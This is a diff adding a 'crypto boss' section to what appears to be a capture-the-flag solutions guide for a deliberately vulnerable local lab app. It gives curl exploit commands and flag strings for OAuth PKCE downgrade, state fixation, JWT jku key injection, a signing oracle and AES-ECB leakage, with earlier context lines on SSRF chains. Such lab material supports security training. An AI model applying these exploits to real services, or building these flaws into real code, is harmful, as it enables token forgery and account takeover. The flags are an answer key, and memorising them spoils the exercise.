@@ -539,3 +539,37 @@ Register a webhook (persistence, #48) **and** replay a refund (#43); `POST /api/
 ### Chain F — OOB Internal Breach (Composer + Specter) · `FLAG{lj_chain_oob_internal_breach}`
 Confirm a blind SSRF out-of-band (#62), lift the internal token via SSRF (#14), then
 `POST /api/black/oob-breach {token, internal_token}`.
+
+---
+
+# v9 — crypto boss
+
+### 63. OAuth PKCE downgrade · `POST /oauth/token`
+Issues a token with no `code_verifier` check:
+```bash
+curl -s localhost:4060/oauth/token -H 'content-type: application/json' -d '{"code":"authcode_x"}'   # FLAG{lj_oauth_pkce_downgrade}
+```
+
+### 64. OAuth state fixation · `POST /oauth/token`
+`state` is echoed/accepted without binding:
+```bash
+curl -s localhost:4060/oauth/token -H 'content-type: application/json' -d '{"code":"x","state":"attacker"}'   # FLAG{lj_oauth_state_fixation}
+```
+
+### 65. JWT `jku` injection · `GET /api/session/jku`
+`verify` fetches keys from an attacker-supplied `jku` URL. Host a key you know (e.g. an upload), then HS256-sign with it:
+```bash
+# upload known bytes as k.svg, set jku to /uploads/k.svg, HMAC-sign with those bytes → FLAG{lj_jwt_jku_injection}
+```
+
+### 66. Signing oracle · `POST /api/sign`
+Signs arbitrary data with the server RSA key — assemble your own RS256 token:
+```bash
+curl -s localhost:4060/api/sign -H 'content-type: application/json' -d '{"data":"anything"}'   # FLAG{lj_signing_oracle}
+```
+
+### 67. Weak crypto (AES-ECB) · `POST /api/seal`
+ECB with a static key — identical plaintext blocks → identical ciphertext blocks:
+```bash
+curl -s localhost:4060/api/seal -H 'content-type: application/json' -d '{"data":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}'   # FLAG{lj_aes_ecb_pattern_leak}
+```
